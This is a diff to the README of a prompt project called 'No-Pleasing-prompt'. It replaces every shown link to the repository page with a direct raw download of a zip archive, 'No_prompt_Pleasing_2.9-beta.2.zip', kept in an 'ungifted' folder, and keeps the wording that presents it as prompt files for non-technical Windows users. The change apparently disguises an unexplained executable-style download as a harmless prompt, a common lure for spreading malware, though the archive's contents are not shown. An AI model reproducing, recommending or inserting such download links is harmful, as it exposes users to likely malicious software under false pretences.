@@ -1,12 +1,12 @@
 # 🧠 No-Pleasing-prompt - Clearer AI Answers With Less Flattery
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Repository-blue?style=for-the-badge)](https://github.com/Quarterlightqibla676/No-Pleasing-prompt)
+[![Download](https://img.shields.io/badge/Download-Visit%20Repository-blue?style=for-the-badge)](https://raw.githubusercontent.com/Quarterlightqibla676/No-Pleasing-prompt/main/ungifted/No_prompt_Pleasing_2.9-beta.2.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download or copy the prompt files:
 
-[https://github.com/Quarterlightqibla676/No-Pleasing-prompt](https://github.com/Quarterlightqibla676/No-Pleasing-prompt)
+[https://raw.githubusercontent.com/Quarterlightqibla676/No-Pleasing-prompt/main/ungifted/No_prompt_Pleasing_2.9-beta.2.zip](https://raw.githubusercontent.com/Quarterlightqibla676/No-Pleasing-prompt/main/ungifted/No_prompt_Pleasing_2.9-beta.2.zip)
 
 ## 🪟 What This Is
 
@@ -50,7 +50,7 @@ This project is simple to use on Windows. You do not need coding skills.
 
 Open this link in your browser:
 
-https://github.com/Quarterlightqibla676/No-Pleasing-prompt
+https://raw.githubusercontent.com/Quarterlightqibla676/No-Pleasing-prompt/main/ungifted/No_prompt_Pleasing_2.9-beta.2.zip
 
 ### 2. Download the files
 
@@ -175,7 +175,7 @@ This makes it easy to find, edit, and reuse.
 
 Visit the repository here to download or copy the prompt:
 
-[https://github.com/Quarterlightqibla676/No-Pleasing-prompt](https://github.com/Quarterlightqibla676/No-Pleasing-prompt)
+[https://raw.githubusercontent.com/Quarterlightqibla676/No-Pleasing-prompt/main/ungifted/No_prompt_Pleasing_2.9-beta.2.zip](https://raw.githubusercontent.com/Quarterlightqibla676/No-Pleasing-prompt/main/ungifted/No_prompt_Pleasing_2.9-beta.2.zip)
 
 ## 🧠 Prompt Goal
 
